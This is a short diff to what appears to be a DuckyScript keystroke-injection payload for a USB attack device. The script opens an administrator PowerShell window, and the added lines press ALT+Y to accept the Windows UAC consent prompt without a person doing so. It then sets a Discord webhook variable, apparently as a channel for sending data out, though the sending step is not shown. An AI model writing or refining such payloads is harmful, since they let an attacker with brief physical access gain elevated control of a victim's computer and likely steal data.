@@ -1,7 +1,9 @@
 GUI r
 DELAY 500
-STRING powershell -Noprofile "Start-Process powershell -verb runas"
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
+DELAY 3000
+ALT y
 DELAY 2500
 STRING $webhook='%DISCORD_WEBHOOK%'
 ENTER
